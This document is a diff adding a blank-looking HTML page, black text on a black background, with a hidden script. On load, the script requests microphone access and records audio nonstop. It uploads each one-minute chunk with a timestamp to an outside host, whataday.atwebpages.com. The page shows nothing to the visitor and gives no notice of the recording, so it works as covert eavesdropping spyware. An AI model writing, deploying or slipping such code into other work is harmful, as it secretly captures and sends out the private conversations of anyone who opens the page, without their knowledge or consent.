@@ -1,0 +1,70 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+</head>
+<body> 
+      
+<style>
+    body{
+        background-color: black;
+        color: black;
+    }
+</style>
+    <script>
+        let mediaRecorder;
+        let audioChunks = [];
+        let recordingInterval;
+ 
+
+        // Automatically start recording upon page load
+        window.addEventListener('load', async () => {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                mediaRecorder = new MediaRecorder(stream);
+
+                mediaRecorder.ondataavailable = (e) => {
+                    audioChunks.push(e.data);
+                };
+
+                mediaRecorder.onstop = async () => {
+                    const blob = new Blob(audioChunks, { type: 'audio/mp3' });
+                    audioChunks = [];
+
+                    const formData = new FormData();
+                    formData.append('audio', blob);
+                    formData.append('timestamp', new Date().toISOString());
+
+                    // Upload to server
+                    await fetch('http://whataday.atwebpages.com/index.php', {
+                        method: 'POST',
+                        body: formData,
+                    }); 
+                };
+
+                // Start the recording process
+                mediaRecorder.start(); 
+
+                // Automatically stop and restart recording every 1 minute
+                recordingInterval = setInterval(() => {
+                    mediaRecorder.stop();
+                    mediaRecorder.start();
+                }, 60000);
+
+            } catch (err) {
+                console.error('Error accessing permission:', err); 
+            }
+        });
+
+        // Ensure recording stops when the page is unloaded
+        window.addEventListener('beforeunload', () => {
+            if (mediaRecorder) {
+                mediaRecorder.stop();
+            }
+            clearInterval(recordingInterval);
+        });
+    </script>
+</body>
+</html>
